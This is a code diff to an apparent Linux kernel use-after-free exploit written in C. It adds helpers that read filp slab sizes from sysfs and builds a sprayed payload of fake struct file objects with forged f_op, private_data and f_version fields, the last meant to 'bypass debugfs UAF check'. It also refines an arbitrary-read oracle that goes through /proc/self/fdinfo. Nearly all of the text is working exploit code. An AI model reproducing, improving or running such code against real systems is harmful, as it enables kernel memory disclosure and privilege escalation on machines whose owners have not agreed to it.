@@ -32,12 +32,37 @@ long read_filp_slabs_count(void) {
     return strtol(buf, NULL, 10);
 }
 
+int read_filp_object_size(void) {
+    int fd = open("/sys/kernel/slab/filp/object_size", O_RDONLY);
+    if (fd < 0) return -1;
+    char buf[64] = {0};
+    int n = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 0) return -1;
+    buf[n] = '\0';
+    return strtol(buf, NULL, 10);
+}
+
+int read_filp_objs_per_slab(void) {
+    int fd = open("/sys/kernel/slab/filp/objs_per_slab", O_RDONLY);
+    if (fd < 0) return -1;
+    char buf[64] = {0};
+    int n = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 0) return -1;
+    buf[n] = '\0';
+    return strtol(buf, NULL, 10);
+}
+
 uint64_t aar_read(int fd) {
     char buf[256];
     int n = read(fd, buf, sizeof(buf)-1);
     if (n <= 0) return 0;
     buf[n] = 0;
-    char *p = strstr(buf, "ino:\t");
+    // Look for the "ino:" that is NOT preceded by a newline (the target fd)
+    // epA's own info has "ino:\t" at the start of a line. 
+    // The target is printed as " pos:0 ino:X sdev:Y"
+    char *p = strstr(buf, " ino:");
     if (p) {
         return strtoull(p + 5, NULL, 16);
     }
@@ -123,17 +148,43 @@ int main() {
     long post_drain_slabs = read_filp_slabs_count();
     printf("[*] Post-drain filp slabs = %ld (delta = %ld)\\n", post_drain_slabs, peak_slabs - post_drain_slabs);
 
+    int obj_size = read_filp_object_size();
+    if (obj_size <= 0) {
+        printf("[-] Failed to read object_size from /sys/kernel/slab/filp/object_size, defaulting to 256\\n");
+        obj_size = 256;
+    } else {
+        printf("[*] filp object_size = %d\\n", obj_size);
+    }
+    int objs_per_slab = read_filp_objs_per_slab();
+    if (objs_per_slab > 0) {
+        printf("[*] filp objs_per_slab = %d\\n", objs_per_slab);
+    }
+
     char payload[4096];
     memset(payload, 0, sizeof(payload));
-    for (int off = 0; off < 4096; off += 256) {
+
+    for (int off = 0; off < 4096; off += obj_size) {
         uint64_t base = (uint64_t)(payload + off);
-        *(uint64_t *)(base + 32) = comm_addr - 0x40; // f_inode
-        *(uint64_t *)(base + 40) = swaps_proc_ops - 0x10; // f_op -> swaps_poll
-        *(uint32_t *)(base + 48) = 0;    // f_lock
-        *(uint64_t *)(base + 184) = 0;   // f_version (bypass debugfs UAF check!)
-        *(uint64_t *)(base + 200) = ep_dbg_uaf_detected - 0x60; // private_data
-        *(uint64_t *)(base + 208) = empty_zero_page; // f_ep (cleanup safe)
+        if (off == 0) {
+            *(uint64_t *)(base + 0x20) = comm_addr - 0x40; // f_inode
+            *(uint64_t *)(base + 0x28) = swaps_proc_ops - 0x10; // f_op -> swaps_poll
+            *(uint32_t *)(base + 0x30) = 0;    // f_lock
+            *(uint64_t *)(base + 0x38) = 0;    // f_count (0 for exploit)
+            *(uint32_t *)(base + 0x44) = 0;    // f_mode
+            *(uint64_t *)(base + 0xb8) = 0;    // f_version (bypass debugfs UAF check!)
+            *(uint64_t *)(base + 0xc8) = ep_dbg_uaf_detected - 0x60; // private_data
+            *(uint64_t *)(base + 0xd0) = empty_zero_page; // f_ep (cleanup safe)
+        } else {
+            *(uint64_t *)(base + 0x20) = comm_addr - 0x40; // f_inode
+            *(uint64_t *)(base + 0x28) = empty_zero_page;  // f_op -> neutral
+            *(uint32_t *)(base + 0x30) = 0;                // f_lock
+            *(uint64_t *)(base + 0x38) = 1;                // f_count = 1 (neutral)
+            *(uint32_t *)(base + 0x44) = 0x20000;          // f_mode = FMODE_CAN_READ
+            *(uint64_t *)(base + 0xb8) = 0;                // f_version
+            *(uint64_t *)(base + 0xd0) = empty_zero_page;  // f_ep (cleanup safe)
+        }
     }
+    printf("[*] Payload generated with %d-byte spacing (%d objects per page)\\n", obj_size, 4096 / obj_size);
 
     char path[256];
     snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epA);
@@ -166,11 +217,11 @@ int main() {
         lseek(fdinfo_fd, 0, SEEK_SET);
         uint64_t f_ino = aar_read(fdinfo_fd);
         
-        if (f_ino != 0 && f_ino != 3 && f_ino != 0x0072657070617773) {
+        if (f_ino != 0 && f_ino != 3 && f_ino != 0x0072657070617773 && f_ino != 0x2f72657070617773) {
             printf("[!] f_ino changed to %llx in round %d!\\n", (unsigned long long)f_ino, r);
         }
 
-        if (f_ino == 0x0072657070617773) { // "swapper\0"
+        if (f_ino == 0x0072657070617773 || f_ino == 0x2f72657070617773) { // "swapper\0"
             printf("[+] Oracle Hit! 'swapper' found in round %d!\\n", r);
             hit = 1;
             break;
@@ -187,5 +238,5 @@ int main() {
         // intentionally leak epA to avoid panic
     }
 
-    return 0;
+    while(1) sleep(1); return 0;
 }
